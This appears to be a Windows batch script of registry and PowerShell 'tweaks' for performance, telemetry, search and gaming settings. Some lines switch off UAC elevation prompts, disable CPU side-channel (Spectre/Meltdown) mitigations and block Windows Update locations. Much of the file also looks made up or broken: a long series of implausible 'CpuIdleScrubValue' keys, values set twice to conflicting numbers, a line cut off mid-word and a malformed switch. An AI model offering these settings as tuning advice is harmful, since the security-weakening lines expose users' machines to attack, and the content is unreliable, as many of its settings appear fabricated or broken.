Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor" /v "PerfEnergyPreference" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor" /v "CPMinCores" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor" /v "CPMaxCores" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor" /v "CPMinCores1" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor" /v "CPMaxCores1" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor" /v "CpLatencyHintUnpark1" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor" /v "CPDistribution" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor" /v "CpLatencyHintUnpark" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor" /v "MaxPerformance1" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor" /v "MaxPerformance" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor" /v "CPDistribution1" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor" /v "CPHEADROOM" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Control Panel\PowerCfg\GlobalPowerPolicy" /v "Policies" /t REG_BINARY /d "01000000020000000100000000000000020000000000000000000000000000002c0100003232030304000000040000000000000000000000840300002c01000000000000840300000001646464640000" /f
Reg.exe add "HKCU\Control Panel\PowerCfg\GlobalPowerPolicy" /v "Policies" /t REG_BINARY /d "01000000020000000100000000000000020000000000000000000000000000002c0100003232030304000000040000000000000000000000840300002c01000000000000840300000001646464640000" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Processor" /v "Cstates" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Processor" /v "Capabilities" /t REG_DWORD /d "516198" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "HighPerformance" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "HighestPerformance" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "MinimumThrottlePercent" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "MaximumThrottlePercent" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "MaximumPerformancePercent" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "Class1InitialUnparkCount" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "InitialUnparkCount" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "MaximumPerformancePercent" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerThrottling" /v "PowerThrottlingOff" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor" /v "CPHEADROOM" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor" /v "CPCONCURRENCY" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "ProccesorThrottlingEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleThreshold" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdle" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuLatencyTimer" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuSlowdown" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "DedicatedSegmentSize" /t REG_DWORD /d "1298" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "Threshold" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuDebuggingEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "ProccesorLatencyThrottlingEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubDelay" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubInterval" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubPower" /t REG_DWORD /d "18" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubThreshold" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubType" /t REG_DWORD /d "2" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValue" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueMaximum" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueMinimum" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueStep" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueDefault" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueCurrent" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValuePrevious" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueNext" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueLast" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueFirst" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueCount" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueIndex" /t REG_DWORD /d "42" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueName" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueDescription" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueDisabled" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueVisible" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueHidden" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueReadOnly" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueReadWrite" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueWriteOnly" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueExecute" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueNoExecute" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueSystem" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueUser" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubPower" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueDisabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubPower" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueCustom" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueAuto" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueManual" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueAutomatic" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueDisabledByDefault" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueEnabledByDefault" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueDefaultEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueDefaultDisabled" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueDefaultAuto" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueDefaultManual" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "LargeSystemCache" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v "EnablePrefetcher" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v "EnableSuperfetch" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "ClearPageFileAtShutdown" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "DisablePagingExecutive" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "LargeSystemCache" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "NonPagedPoolQuota" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "NonPagedPoolSize" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "PagedPoolQuota" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "PagedPoolSize" /t REG_DWORD /d "192" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "SecondLevelDataCache" /t REG_DWORD /d "1024" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "SessionPoolSize" /t REG_DWORD /d "192" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "SessionViewSize" /t REG_DWORD /d "192" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "SystemPages" /t REG_DWORD /d "4294967295" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "PhysicalAddressExtension" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "ClearPageFileAtShutdown" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "DisablePagingExecutive" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "LargeSystemCache" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "NonPagedPoolQuota" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "NonPagedPoolSize" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "PagedPoolQuota" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "PagedPoolSize" /t REG_DWORD /d "192" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "SecondLevelDataCache" /t REG_DWORD /d "1024" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "SessionPoolSize" /t REG_DWORD /d "192" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "SessionViewSize" /t REG_DWORD /d "192" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "SystemPages" /t REG_DWORD /d "4294967295" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "PhysicalAddressExtension" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "FeatureSettings" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "FeatureSettingsOverride" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "FeatureSettingsOverrideMask" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "IoPageLockLimit" /t REG_DWORD /d "16710656" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "PoolUsageMaximum" /t REG_DWORD /d "96" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v "EnablePrefetcher" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v "EnableSuperfetch" /t REG_D
cls
POWERSHELL "Disable-MMAgent -MemoryCompression"
POWERSHELL Disable-MMAgent -MemoryCompression -ApplicationPreLaunch -ErrorAction SilentlyContinue 
cls
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\Power /v Class2InitialUnparkCount /t REG_DWORD /d 100 /f
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\Power /v EnergyEstimationDisabled /t REG_DWORD /d 1 /f
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\Power /v PerfBoostAtGuaranteed /t REG_DWORD /d 1 /f
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\Power /v PpmMfBufferingThreshold /t REG_DWORD /d 0 /f
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\Power /v MfOverridesDisabled /t REG_DWORD /d 1 /f
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\Power /v PpmMfOverridesDisabled /t REG_DWORD /d 1 /f
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\Power /v UserBatteryDischargeEstimator /t REG_DWORD /d 1 /f
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\Power /v PowerThrottlingOff /t REG_DWORD /d 1 /f
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerThrottling /v PowerThrottlingOff /t REG_DWORD /d 1 /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\SettingSync" /v "SyncPolicy" /t REG_DWORD /d 00000005 /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\SettingSync\Groups\Personalization" /v "Enabled" /t REG_DWORD /d 00000000 /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\SettingSync\Groups\BrowserSettings" /v "Enabled" /t REG_DWORD /d 00000000 /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\SettingSync\Groups\Credentials" /v "Enabled" /t REG_DWORD /d 00000000 /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\SettingSync\Groups\Accessibility" /v "Enabled" /t REG_DWORD /d 00000000 /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\SettingSync\Groups\Windows" /v "Enabled" /t REG_DWORD /d 00000000 /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v "DoNotConnectToWindowsUpdateInternetLocations" /t REG_DWORD /d "1" /f
Reg Add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v "AllowCortana" /t REG_DWORD /d "0" /f
Reg Add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v "AllowCloudSearch" /t REG_DWORD /d "0" /f
Reg Add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v "AllowCortanaAboveLock" /t REG_DWORD /d "0" /f 
Reg Add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v "AllowSearchToUseLocation" /t REG_DWORD /d "0" /f
Reg Add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v "ConnectedSearchUseWeb" /t REG_DWORD /d "0" /f
Reg Add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v "ConnectedSearchUseWebOverMeteredConnections" /t REG_DWORD /d "0" /f 
Reg Add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v "DisableWebSearch" /t REG_DWORD /d "0" /f 
Reg Add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v "ShowFrequent" /t REG_DWORD /d "0" /f
Reg Add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v "ShowRecent" /t REG_DWORD /d "0" /f
Reg Add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v "TelemetrySalt" /t REG_DWORD /d "0" /f
Reg Add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoRecentDocsHistory" /t REG_DWORD /d "1" /f
Reg Add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /v "Discord" /t REG_BINARY /d "0300000066AF9C7C5A46D901" /f
Reg Add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /v "Spotify" /t REG_BINARY /d "0300000070E93D7B5A46D901" /f
Reg Add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /v "Steam" /t REG_BINARY /d "03000000E7766B83316FD901" /f
Reg add "HKLM\Software\Policies\Microsoft\Windows\Maps" /v "AutoDownloadAndUpdateMapData" /t REG_DWORD /d "0" /f
Reg add "HKLM\Software\Policies\Microsoft\Windows\Maps" /v "AllowUntriggeredNetworkTrafficOnSettingsPage" /t REG_DWORD /d "0" /f
Reg add "HKLM\Software\Policies\Microsoft\Windows\SettingSync" /v "DisableSettingSync" /t REG_DWORD /d "2" /f
Reg add "HKLM\Software\Policies\Microsoft\Windows\SettingSync" /v "DisableSettingSyncUserOverride" /t REG_DWORD /d "1" /f
Reg add "HKLM\Software\Policies\Microsoft\Windows\SettingSync" /v "DisableSyncOnPaidNetwork" /t REG_DWORD /d "1" /f
Reg add "HKLM\Software\Policies\Microsoft\FindMyDevice" /v "AllowFindMyDevice" /t REG_DWORD /d "0" /f
Reg add "HKLM\Software\Policies\Microsoft\FindMyDevice" /v "LocationSyncEnabled" /t REG_DWORD /d "0" /f
Reg add "HKLM\Software\Policies\Microsoft\Windows\Windows Search" /v "ConnectedSearchUseWeb" /t REG_DWORD /d "0" /f
Reg add "HKLM\Software\Policies\Microsoft\Windows\Windows Search" /v "DisableWebSearch" /t REG_DWORD /d "1" /f
Reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Search" /v "BingSearchEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Device Metadata" /v "PreventDeviceMetadataFromNetwork" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\PolicyManager\current\device\Update" /v "ExcludeWUDriversInQualityUpdate" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\PolicyManager\default\Update" /v "ExcludeWUDriversInQualityUpdate" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\PolicyManager\default\Update\ExcludeWUDriversInQualityUpdate" /v "value" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings" /v "ExcludeWUDriversInQualityUpdate" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v "ExcludeWUDriversInQualityUpdate" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\DriverSearching" /v "SearchOrderConfig" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "PromptOnSecureDesktop" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableAutomaticRestartSignOn" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\Maintenance" /v "MaintenanceDisabled" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\CloudContent" /v "DisableWindowsConsumerFeatures" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Power" /v "HiberbootEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerThrottling" /v "PowerThrottlingOff" /t REG_DWORD /d "1" /
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "FastSendDatagramThreshold" /t REG_DWORD /d "409600" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize" /v "EnableTransparency" /t REG_DWORD /d 00000000 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\ApplicationManagement\AllowGameDVR" /v "value" /t REG_DWORD /d 00000000 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\GameDVR" /v "AllowGameDVR" /t REG_DWORD /d 00000000 /f
reg add "HKEY_CURRENT_USER\System\GameConfigStore" /v "GameDVR_Enabled" /t REG_DWORD /d 00000000 /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\GameDVR" /v "AppCaptureEnabled" /t REG_DWORD /d 00000000 /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\GameBar" /v "AllowAutoGameMode" /t REG_DWORD /d 00000001 /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\GameBar" /v "AutoGameModeEnabled" /t REG_DWORD /d 00000001 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\GraphicsDrivers" /v "HwSchMode" /t REG_DWORD /d 00000002 /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\DirectX\UserGpuPreferences" /v "DirectXUserGlobalSettings" /t REG_SZ /d "VRROptimizeEnable=0;" /f
reg add "HKEY_CURRENT_USER\Control Panel\Accessibility\MouseKeys" /v "Flags" /t REG_SZ /d "0" /f
reg add "HKEY_CURRENT_USER\Control Panel\Accessibility\StickyKeys" /v "Flags" /t REG_SZ /d "0" /f
reg add "HKEY_CURRENT_USER\Control Panel\Accessibility\Keyboard Response" /v "Flags" /t REG_SZ /d "0" /f
reg add "HKEY_CURRENT_USER\Control Panel\Accessibility\ToggleKeys" /v "Flags" /t REG_SZ /d "0" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\AdvertisingInfo" /v "Enabled" /t REG_DWORD /d 00000000 /f
reg add "HKEY_CURRENT_USER\Control Panel\International\User Profile" /v "HttpAcceptLanguageOptOut" /t REG_DWORD /d 00000001 /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "Start_TrackProgs" /t REG_DWORD /d 00000000 /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContent-338393Enabled" /t REG_DWORD /d 00000000 /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContent-353694Enabled" /t REG_DWORD /d 00000000 /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SubscribedContent-353696Enabled" /t REG_DWORD /d 00000000 /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Speech_OneCore\Settings\OnlineSpeechPrivacy" /v "HasAccepted" /t REG_DWORD /d 00000000 /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Personalization\Settings" /v "AcceptedPrivacyPolicy" /t REG_DWORD /d 00000000 /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\InputPersonalization" /v "RestrictImplicitInkCollection" /t REG_DWORD /d 00000001 /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\InputPersonalization" /v "RestrictImplicitTextCollection" /t REG_DWORD /d 00000001 /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\InputPersonalization\TrainedDataStore" /v "HarvestContacts" /t REG_DWORD /d 00000000 /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Diagnostics\DiagTrack" /v "ShowedToastAtLevel" /t REG_DWORD /d 00000001 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\DataCollection" /v "AllowTelemetry" /t REG_DWORD /d 00000000 /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Privacy" /v "TailoredExperiencesWithDiagnosticDataEnabled" /t REG_DWORD /d 00000000 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Diagnostics\DiagTrack\EventTranscriptKey" /v "EnableEventTranscript" /t REG_DWORD /d 00000000 /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Siuf\Rules" /v "NumberOfSIUFInPeriod" /t REG_DWORD /d 00000000 /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Siuf\Rules" /v "PeriodInNanoSeconds" /t REG_SZ /d "-" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\System" /v "PublishUserActivities" /t REG_DWORD /d 00000000 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\System" /v "UploadUserActivities" /t REG_DWORD /d 00000000 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\userNotificationListener" /v "Value" /t REG_SZ /d "Deny" /f
